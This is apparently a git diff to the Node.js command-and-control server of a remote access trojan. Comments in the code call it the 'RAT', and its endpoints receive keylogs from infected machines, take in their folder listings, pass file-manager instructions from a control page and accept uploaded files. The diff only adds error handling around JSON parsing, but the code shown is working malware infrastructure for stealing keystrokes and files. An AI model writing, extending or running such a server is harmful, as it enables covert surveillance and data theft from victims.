@@ -10,6 +10,7 @@ let keylog = [];
 let folders = { files: [], current_dir: [] };
 let dirman_instruction = undefined;
 let tempdetails = {};
+let streambuffer = null;
 
 //404 page goes here
 function notfoundpage(response, url) {
@@ -18,9 +19,18 @@ function notfoundpage(response, url) {
     console.error('File not found: ', url)
 }
 
+function throwawayparse(data) {
+    try {
+        return JSON.parse(data)
+    } catch (error) {
+        console.log(error)
+        return { problem: error }
+    }
+}
+
 const server = http.createServer(function (request, response) {//Create server
 
-    response.setHeader('Acess-Control-Allow-Origin', '*');//allow access control from client, this will automatically handle most media files
+    response.setHeader('Acess-Control-Allow-Origin', '*');//allow access control from client, this will automatically handle most media files00
 
     try {
 
@@ -50,7 +60,7 @@ const server = http.createServer(function (request, response) {//Create server
             case '/action/post/keylog'://receive keylog from Rat
 
                 request.on('data', function (data) {
-                    keylog = JSON.parse(data)
+                    keylog = throwawayparse(data)
                     response.end()
                 });
 
@@ -66,7 +76,7 @@ const server = http.createServer(function (request, response) {//Create server
             case '/action/post/folders'://receive folder structure from RAT
 
                 request.on('data', function (data) {
-                    folders = JSON.parse(data)
+                    folders = throwawayparse(data)
                     response.writeHead(200, { 'Content-type': 'application/json' });//200 ok
                     if (dirman_instruction != undefined) {
                         response.write(JSON.stringify(dirman_instruction))//Reply with instructions from control page
@@ -80,7 +90,7 @@ const server = http.createServer(function (request, response) {//Create server
             case '/action/post/folders/instruct'://receive folder instructions from Control page
 
                 request.on('data', function (data) {
-                    dirman_instruction = JSON.parse(data)
+                    dirman_instruction = throwawayparse(data)
                     console.log('folder instruction data :', dirman_instruction)
                     response.writeHead(200, { 'Content-type': 'application/json' })
                     response.end(JSON.stringify({ server: 'instruction received' }))
@@ -91,7 +101,7 @@ const server = http.createServer(function (request, response) {//Create server
             case '/action/post/file/info'://receive file data instructions before buffers are posted
 
                 request.on('data', function (data) {
-                    tempdetails = JSON.parse(data);//Incomming file details before buffers
+                    tempdetails = throwawayparse(data);//Incomming file details before buffers
                     var fpath = path.join('temp/', tempdetails.base)
 
                     if (!fs.existsSync('temp/')) {// if temporary file folder does not exist
